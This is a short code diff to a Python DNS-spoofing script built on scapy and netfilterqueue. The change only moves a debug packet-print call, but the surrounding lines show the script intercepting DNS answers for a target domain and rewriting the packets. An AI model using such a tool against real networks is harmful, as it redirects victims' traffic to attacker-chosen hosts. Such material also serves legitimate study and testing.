@@ -118,6 +118,7 @@ try:
     print("[Info]--> DNS spoofing is started .......")
     def packeting(packet):
         ippacket = sc.IP(packet.get_payload())
+        ippacket.show()
         if ippacket.haslayer(sc.DNSRR):
             reqname = ippacket[sc.DNSQR].qname
             if domain in str(reqname):
@@ -130,7 +131,6 @@ try:
                 del ippacket[sc.UDP].len
                 del ippacket[sc.UDP].chksum
                 packet.set_payload(bytes(ippacket))
-            ippacket.show()
         packet.accept()
     nfqu = netfilterqueue.NetfilterQueue()
     nfqu.bind(0, packeting)
